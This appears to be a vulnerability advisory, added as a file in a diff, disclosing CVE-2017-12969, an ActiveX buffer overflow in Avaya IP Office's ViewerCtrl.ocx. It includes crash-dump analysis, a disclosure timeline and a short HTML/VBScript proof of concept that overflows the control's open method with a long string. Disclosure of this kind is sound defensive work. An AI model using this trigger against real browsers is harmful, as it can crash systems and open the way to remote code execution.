@@ -1,0 +1,156 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AVAYA-OFFICE-IP-(IPO)-v9.1.0-10.1-VIEWERCTRL-ACTIVE-X-BUFFER-OVERFLOW-0DAY.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+=============
+www.avaya.com
+
+
+
+Product:
+===========
+Avaya IP Office (IPO) 
+v9.1.0 - 10.1
+
+IP Office is Avaya's global midsize solution for enterprises, supporting up to 3,000 users at a single location with IP Office Select editions.
+For businesses with multiple locations, IP Office provides a powerful set of tools to help streamline operations, centralize management, and
+reduce total cost of ownership for converged networks. Using industry standards, IP Office enables companies to share resources, provide
+improved customer service, and keep mobile employees accessible.
+
+Provides a hybrid PBX with TDM and IP telephony and trunk support.
+Provides IP routing, switching and firewall protection, between LAN and WAN (LAN2).
+
+In addition to basic telephony services and voicemail, IP Office offers both hard phone and soft phone options.
+Includes a robust set of tools for administration (Manager), call tracking (SMDR), and system monitoring and diagnostics (System Status Application).
+
+Available editions: Basic, Essential, Preferred, Server, Server Select, Server with Virtualized Software, Server/Sever Select hosted in the Cloud.
+
+
+
+Vulnerability Type:
+====================
+ActiveX Remote Buffer Overflow
+
+
+
+
+CVE Reference:
+==============
+CVE-2017-12969
+ASA-2017-313
+
+
+
+Security Issue:
+================
+ViewerCtrl.ocx ActiveX Component used by Avaya IP Office (IPO) can be exploited by remote attackers to potentially execute arbitrary
+attacker supplied code. User would have to visit a malicious webpage using InternetExplorer where the exploit could be triggered.
+
+Clsid: {27F12EFD-325D-4907-A2D2-C38A2B6D3334}
+Safe for Script: False
+Safe for Init: False
+
+ACCESS_VIOLATION
+8C4A77 MOV EAX,[ECX]
+
+SEH Chain:
+-----------
+1 8D00A3 po.dll
+2 36A7E95 CIPElements.dll
+3 36A8115 CIPElements.dll
+4 788719 ViewerCtrl.OCX
+5 788533 ViewerCtrl.OCX
+6 78862A ViewerCtrl.OCX
+7 6008793E mfc90u.dll
+8 60089B31 mfc90u.dll
+9 779858C5 ntdll.dll
+
+
+(d360.1040c): Access violation - code c0000005 (first/second chance not available)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for po.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for CIPElements.dll - 
+eax=0608ec18 ebx=00000000 ecx=00000000 edx=00000000 esi=0aa7bdd0 edi=0aa7bdd0
+eip=06064a77 esp=03535c78 ebp=03535db0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210246
+po!cip::po::SpecialObjects::getPresetObject+0x77:
+06064a77 8b01            mov     eax,dword ptr [ecx]  ds:002b:00000000=????????
+0:008> !load winext/msec
+0:008> !exploitable
+
+!exploitable 1.6.0.0
+*** ERROR: Module load completed but symbols could not be loaded for mfc90u.dll
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for mshtml.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for user32.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ieframe.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for iertutil.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for IEShims.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for kernel32.dll - 
+
+Exploitability Classification: PROBABLY_EXPLOITABLE
+
+Recommended Bug Title: Probably Exploitable - Data from Faulting Address controls Code Flow starting at 
+po!cip::po::SpecialObjects::getPresetObject+0x0000000000000077 (Hash=0x6f1f914b.0xc46b7285)
+
+The data from the faulting address is later used as the target for a branch.
+
+
+References:
+==============
+https://downloads.avaya.com/css/P8/documents/101044091
+
+
+Exploit/POC:
+=============
+
+<object classid='clsid:27F12EFD-325D-4907-A2D2-C38A2B6D3334' id='victim' />
+
+<script language='vbscript'>
+victimFile = "C:\Program Files (x86)\Avaya\IP Office Contact Center\User Interface\ViewerCtrl.ocx"
+prototype  = "Function open ( ByVal containerId As String ) As Long"
+memberName = "open"
+progid     = "ViewerCtrlLib.ViewerCtrl"
+argCount   = 1
+payload=String(5142, "A")
+
+victim.open payload
+
+</script>
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification:  July 12, 2017
+Vendor acknowlegement: July 14, 2017
+CVE assigned by mitre : August 19, 2017
+Vendor advisory : November 4, 2017
+November 5, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
